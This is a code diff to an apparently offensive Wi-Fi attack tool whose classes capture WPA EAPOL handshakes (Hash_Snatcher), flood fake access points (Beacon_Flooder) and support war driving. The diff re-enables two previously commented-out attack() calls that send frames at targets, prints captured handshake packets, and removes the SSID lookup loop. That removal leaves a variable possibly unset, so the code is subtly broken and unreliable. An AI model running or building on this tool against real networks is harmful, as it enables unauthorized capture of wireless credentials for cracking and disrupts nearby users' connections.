@@ -1005,7 +1005,6 @@ class Frame_Snatcher():
             console.print(f'[bold red]Exception Error:[yellow] {e}')   
 
 
-
 class Beacon_Flooder():
     """This class will be responsible for creating and flooding fake APs to nearby devices"""
     
@@ -1608,11 +1607,11 @@ class Hash_Snatcher():
 
 
         # NOW ATTACK
-        #attack(frames=frames, count=50, delay=10, sent=3, realtime=0)
+        attack(frames=frames, count=50, delay=10, sent=3, realtime=0)
 
 
         # NOW SLOW ATTACK
-        #attack(frames=frames, count=10, delay=10)
+        attack(frames=frames, count=10, delay=10)
 
 
         # DONE
@@ -1660,7 +1659,7 @@ class Hash_Snatcher():
                     while STAY:
                         try:
                             console.print(f"Cleaning up", style="bold red")
-                            time.sleep(3)
+                            time.sleep(0.1)
 
                             STAY = False       # BREAK NESTED LOOP
                             cls.SNIFF = False  # KILL BACKGROUND THREAD 
@@ -1700,7 +1699,9 @@ class Hash_Snatcher():
 
 
             # ONLY EAPOL // HANDSHAKES
-            if pkt.haslayer(EAPOL):
+            if pkt.haslayer(EAPOL): 
+
+                console.print(pkt)
 
 
 
@@ -1713,12 +1714,6 @@ class Hash_Snatcher():
                 
                 # GET SSID
 
-                for mac, ssid in cls.ssids:
-
-                    if ssid.strip() == addr1 or ssid == addr2:
-                        
-                        sd = ssid
-
 
                 if addr1:
 
@@ -1730,13 +1725,7 @@ class Hash_Snatcher():
 
                     console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")
 
-                
-                    #console.input("\nENTER TO CONTINUE: ")
-            
 
-           # else:
-           # console.print(pkt)   # ABOVE AND TO THE LEFT IS FOR DEBUGGING
-        
 
 
         # SNIFF FOR HASHES
@@ -1793,7 +1782,6 @@ class Hash_Snatcher():
 
         except Exception as e:
             console.print(f"[bold red]Exception Error:[yellow] {e}")
-
 
 
 class War_Driving():
